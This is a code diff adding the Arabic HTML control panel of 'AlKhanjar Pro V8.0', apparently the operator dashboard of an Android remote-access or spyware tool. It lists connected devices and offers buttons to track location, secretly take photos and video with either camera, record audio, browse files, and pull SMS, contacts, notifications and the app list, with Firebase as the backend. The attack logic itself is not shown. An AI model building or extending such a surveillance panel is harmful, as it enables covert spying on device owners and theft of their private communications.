@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlKhanjar Pro V8.0 - لوحة التحكم</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <svg width="40" height="40" viewBox="0 0 40 40">
+                    <path d="M20 2L5 8v10c0 9.25 6.4 17.9 15 20 8.6-2.1 15-10.75 15-20V8l-15-6z" fill="#00ff00"/>
+                </svg>
+                <h1>AlKhanjar Pro V8.0</h1>
+            </div>
+            <div class="user-info">
+                <span id="deviceCount">0 أجهزة متصلة</span>
+                <button onclick="logout()" class="btn-logout">تسجيل خروج</button>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Sidebar - Device List -->
+            <aside class="sidebar">
+                <div class="sidebar-header">
+                    <h2>الأجهزة المتصلة</h2>
+                    <button onclick="refreshDevices()" class="btn-refresh">🔄</button>
+                </div>
+                <div id="devicesList" class="devices-list">
+                    <div class="loading">جاري التحميل...</div>
+                </div>
+            </aside>
+
+            <!-- Control Panel -->
+            <main class="control-panel">
+                <div id="noDeviceSelected" class="no-device">
+                    <svg width="100" height="100" viewBox="0 0 100 100">
+                        <circle cx="50" cy="50" r="40" stroke="#333" stroke-width="2" fill="none"/>
+                        <text x="50" y="55" text-anchor="middle" font-size="40">📱</text>
+                    </svg>
+                    <h3>لم يتم اختيار جهاز</h3>
+                    <p>اختر جهازاً من القائمة الجانبية للبدء</p>
+                </div>
+
+                <div id="deviceControl" class="device-control" style="display: none;">
+                    <!-- Device Info -->
+                    <div class="device-info">
+                        <h2 id="deviceName">اسم الجهاز</h2>
+                        <div class="device-details">
+                            <div class="detail-item">
+                                <span class="label">الحالة:</span>
+                                <span id="deviceStatus" class="status">Offline</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="label">البطارية:</span>
+                                <span id="deviceBattery">-</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="label">آخر اتصال:</span>
+                                <span id="deviceLastSeen">-</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Control Tabs -->
+                    <div class="tabs">
+                        <button class="tab active" onclick="switchTab('location')">الموقع</button>
+                        <button class="tab" onclick="switchTab('camera')">الكاميرا</button>
+                        <button class="tab" onclick="switchTab('audio')">الصوت</button>
+                        <button class="tab" onclick="switchTab('files')">الملفات</button>
+                        <button class="tab" onclick="switchTab('data')">البيانات</button>
+                        <button class="tab" onclick="switchTab('apps')">التطبيقات</button>
+                    </div>
+
+                    <!-- Tab Content -->
+                    <div class="tab-content">
+                        <!-- Location Tab -->
+                        <div id="locationTab" class="tab-panel active">
+                            <h3>📍 الموقع الحالي</h3>
+                            <button onclick="getLocation()" class="btn-primary">الحصول على الموقع</button>
+                            <div id="locationResult" class="result"></div>
+                            <div id="mapContainer" style="width: 100%; height: 400px; margin-top: 20px; display: none;">
+                                <iframe id="mapFrame" width="100%" height="100%" frameborder="0"></iframe>
+                            </div>
+                        </div>
+
+                        <!-- Camera Tab -->
+                        <div id="cameraTab" class="tab-panel">
+                            <h3>📸 التحكم بالكاميرا</h3>
+                            <div class="button-group">
+                                <button onclick="takePhoto('back')" class="btn-primary">التقاط صورة (خلفية)</button>
+                                <button onclick="takePhoto('front')" class="btn-primary">التقاط صورة (أمامية)</button>
+                            </div>
+                            <div class="button-group">
+                                <button onclick="startVideo('back')" class="btn-success">بدء تسجيل فيديو (خلفية)</button>
+                                <button onclick="startVideo('front')" class="btn-success">بدء تسجيل فيديو (أمامية)</button>
+                                <button onclick="stopVideo()" class="btn-danger">إيقاف التسجيل</button>
+                            </div>
+                            <div id="cameraResult" class="result"></div>
+                        </div>
+
+                        <!-- Audio Tab -->
+                        <div id="audioTab" class="tab-panel">
+                            <h3>🎤 تسجيل الصوت</h3>
+                            <div class="input-group">
+                                <label>مدة التسجيل (ثانية):</label>
+                                <input type="number" id="audioDuration" value="30" min="1" max="300">
+                            </div>
+                            <button onclick="recordAudio()" class="btn-primary">بدء التسجيل</button>
+                            <div id="audioResult" class="result"></div>
+                        </div>
+
+                        <!-- Files Tab -->
+                        <div id="filesTab" class="tab-panel">
+                            <h3>📁 مدير الملفات</h3>
+                            <div class="file-path">
+                                <input type="text" id="filePath" value="/" placeholder="/path/to/directory">
+                                <button onclick="listFiles()" class="btn-primary">عرض</button>
+                            </div>
+                            <div id="filesResult" class="result files-grid"></div>
+                        </div>
+
+                        <!-- Data Tab -->
+                        <div id="dataTab" class="tab-panel">
+                            <h3>📊 البيانات</h3>
+                            <div class="button-group">
+                                <button onclick="getSms()" class="btn-primary">قراءة الرسائل</button>
+                                <button onclick="getContacts()" class="btn-primary">جهات الاتصال</button>
+                                <button onclick="getNotifications()" class="btn-primary">الإشعارات</button>
+                            </div>
+                            <div id="dataResult" class="result"></div>
+                        </div>
+
+                        <!-- Apps Tab -->
+                        <div id="appsTab" class="tab-panel">
+                            <h3>📱 التطبيقات المثبتة</h3>
+                            <button onclick="getApps()" class="btn-primary">عرض التطبيقات</button>
+                            <div id="appsResult" class="result"></div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage-compat.js"></script>
+    
+    <!-- Custom Scripts -->
+    <script src="js/firebase-config.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
